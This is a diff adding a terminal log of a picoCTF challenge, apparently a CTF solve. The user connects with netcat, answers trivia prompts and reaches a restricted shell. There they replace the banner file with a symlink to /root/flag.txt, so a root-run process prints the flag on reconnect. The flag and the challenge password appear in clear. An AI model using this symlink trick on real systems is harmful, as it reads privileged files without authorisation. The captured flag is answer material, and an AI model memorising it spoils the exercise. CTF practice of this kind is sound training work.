@@ -1,0 +1,53 @@
+─(white㉿white)-[~/…/PICO-CTF/picoctfAI/web/source]
+└─$  nc tethys.picoctf.net 59015
+*************************************
+**************WELCOME****************
+*************************************
+
+what is the password? 
+My_Passw@rd_@1234
+What is the top cyber security conference in the world?
+DEFCON
+the first hacker ever was known for phreaking(making free phone calls), who was it?
+John Draper
+player@challenge:~$ ls
+ls
+banner  text
+player@challenge:~$ whoami
+whoami
+player
+player@challenge:~$ cd /home/player
+cd /home/player
+player@challenge:~$ ls
+ls
+banner  text
+player@challenge:~$ cat text
+cat text
+keep digging
+player@challenge:~$ cat banner
+cat banner
+*************************************
+**************WELCOME****************
+*************************************
+player@challenge:~$ # Inside the shell
+cd /home/player
+rm banner
+ln -s /root/flag.txt banner
+exit   # Inside the shell
+player@challenge:~$ cd /home/player
+player@challenge:~$ rm banner
+player@challenge:~$ ln -s /root/flag.txt banner
+player@challenge:~$ 
+exit   
+logout
+What is the top cyber security conference in the world?
+DEFCON
+the first hacker ever was known for phreaking(making free phone calls), who was it?
+^C
+                                                                                                                                                                       
+┌──(white㉿white)-[~/…/PICO-CTF/picoctfAI/web/source]
+└─$  nc tethys.picoctf.net 59015
+picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_f7608541}
+
+what is the password? 
+
